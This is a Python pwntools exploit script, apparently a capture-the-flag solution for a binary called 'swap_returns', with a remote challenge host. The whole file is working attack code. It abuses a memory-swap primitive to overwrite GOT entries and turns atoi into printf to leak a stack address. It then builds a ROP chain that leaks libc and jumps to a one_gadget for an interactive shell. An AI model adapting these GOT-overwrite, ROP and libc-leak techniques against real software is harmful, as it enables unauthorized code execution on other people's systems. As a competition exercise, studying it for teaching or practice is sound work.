#!/usr/bin/env python
from pwn import *

def select(num):
    s.sendafter('Your choice: \n', str(num))

def swap(first, second):
    select(1)
    s.sendlineafter('address: \n', str(first))
    s.sendlineafter('address: \n', str(second))
    select(2)

def overwrite(target, data):
    for i, d in enumerate(data):
        swap(stack_base + 0x18, 0x601100 + ord(d))
        swap(stack_base - 0x18, 0x601100 + ord(d))
        swap(stack_base + 0x18, 0x601100 + ord(d))
        swap(stack_base + 0xe8, 0x601300 + i % 8)
        if i % 8 == 7 or i == len(data) - 1:
            swap(target + (i & ~7), 0x601300)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./swap_returns', env = {'LD_PRELOAD': './libc.so.6'})
    else:
        s = remote('swap.chal.ctf.westerns.tokyo', 37567)

    elf = ELF('./swap_returns')
    libc = ELF('./libc.so.6')

    select(0)
    swap(elf.got['atoi'], elf.got['printf'])
    s.sendafter('Your choice: \n', '%p')
    stack_base = int(s.recvuntil('1. ')[:-3], 16) + 0x4a
    log.info('stack base: %#x' % stack_base)
    s.sendafter('Your choice: \n', 'AA')

    leave = 0x4008e7
    pop_rdi = 0x400a53
    pop_rsi_r15 = 0x400a51

    overwrite(elf.got['_exit'], p64(leave))
    overwrite(stack_base, p64(0x601400 - 8) + p64(pop_rsi_r15))

    payload = ''
    payload += p64(pop_rdi) + p64(elf.got['puts'])
    payload += p64(elf.symbols['puts'])
    payload += p64(pop_rdi) + p64(0x601400)
    payload += p64(elf.symbols['atoi'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(0x601400) + p64(0)
    payload += p64(elf.symbols['read'])
    payload += p64(leave)

    overwrite(stack_base + 0x20, payload)

    select(3)

    s.recvuntil('Bye. ')
    libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['puts']
    log.info('libc base: %#x' % libc_base)

    one_gadgets = [0x45526, 0x4557a, 0xf1651, 0xf24cb]
    s.send(p64(libc_base + one_gadgets[1]))

    s.interactive()
